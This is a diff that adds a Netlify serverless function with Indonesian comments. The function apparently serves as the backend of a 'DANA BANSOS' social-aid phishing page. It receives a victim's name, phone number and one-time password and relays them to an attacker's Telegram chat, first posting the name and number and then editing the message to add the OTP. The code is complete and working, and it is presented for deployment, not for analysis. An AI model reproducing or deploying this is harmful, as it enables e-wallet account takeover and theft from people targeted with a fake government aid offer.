@@ -1,1 +1,131 @@
+// netlify/functions/send-dana-bansos.js
+// Pastikan environment variable berikut sudah diatur di Netlify:
+// - TELEGRAM_TOKEN: token bot Telegram
+// - TELEGRAM_CHAT_ID: ID chat tujuan (bisa ID user, grup, atau channel)
 
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+exports.handler = async (event) => {
+  // Log keberadaan environment variable (tanpa menampilkan nilainya)
+  console.log('TELEGRAM_TOKEN exists:', !!TELEGRAM_TOKEN);
+  console.log('TELEGRAM_CHAT_ID exists:', !!TELEGRAM_CHAT_ID);
+
+  // Hanya izinkan method POST
+  if (event.httpMethod !== 'POST') {
+    return {
+      statusCode: 405,
+      body: JSON.stringify({ error: 'Method not allowed' })
+    };
+  }
+
+  // Parse body
+  let payload;
+  try {
+    payload = JSON.parse(event.body);
+    console.log('Payload received:', payload);
+  } catch (e) {
+    console.error('Invalid JSON:', e);
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ error: 'Invalid JSON' })
+    };
+  }
+
+  const { action, nama, phone, otp, messageId } = payload;
+
+  if (!action) {
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ error: 'Missing action' })
+    };
+  }
+
+  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
+    return {
+      statusCode: 500,
+      body: JSON.stringify({ error: 'Server configuration error' })
+    };
+  }
+
+  // Fungsi untuk mengirim pesan baru
+  const sendMessage = async (text) => {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    });
+    const data = await response.json();
+    console.log('sendMessage response:', data);
+    if (!data.ok) throw new Error(data.description);
+    return data.result.message_id;
+  };
+
+  // Fungsi untuk mengedit pesan
+  const editMessage = async (messageId, text) => {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        message_id: messageId,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    });
+    const data = await response.json();
+    console.log('editMessage response:', data);
+    if (!data.ok) throw new Error(data.description);
+    return data.ok;
+  };
+
+  try {
+    if (action === 'send') {
+      if (!nama || !phone) {
+        return {
+          statusCode: 400,
+          body: JSON.stringify({ error: 'Missing nama or phone for send action' })
+        };
+      }
+      const pesanAwal = `├• AKUN | DANA BANSOS \n├───────────────────\n├• NAMA : ${nama}\n├───────────────────\n├• NO HP  : ${phone}\n├───────────────────\n├• OTP : \n╰───────────────────`;
+      const newMessageId = await sendMessage(pesanAwal);
+      return {
+        statusCode: 200,
+        body: JSON.stringify({ success: true, messageId: newMessageId })
+      };
+    } 
+    else if (action === 'edit') {
+      if (!messageId || !otp || !nama || !phone) {
+        return {
+          statusCode: 400,
+          body: JSON.stringify({ error: 'Missing messageId, otp, nama, or phone for edit action' })
+        };
+      }
+      const pesanLengkap = `├• AKUN | DANA BANSOS \n├───────────────────\n├• NAMA : ${nama}\n├───────────────────\n├• NO HP  : ${phone}\n├───────────────────\n├• OTP : ${otp}\n╰───────────────────`;
+      await editMessage(messageId, pesanLengkap);
+      return {
+        statusCode: 200,
+        body: JSON.stringify({ success: true })
+      };
+    } 
+    else {
+      return {
+        statusCode: 400,
+        body: JSON.stringify({ error: 'Invalid action' })
+      };
+    }
+  } catch (error) {
+    console.error('Telegram API error:', error);
+    return {
+      statusCode: 500,
+      body: JSON.stringify({ error: error.message })
+    };
+  }
+};
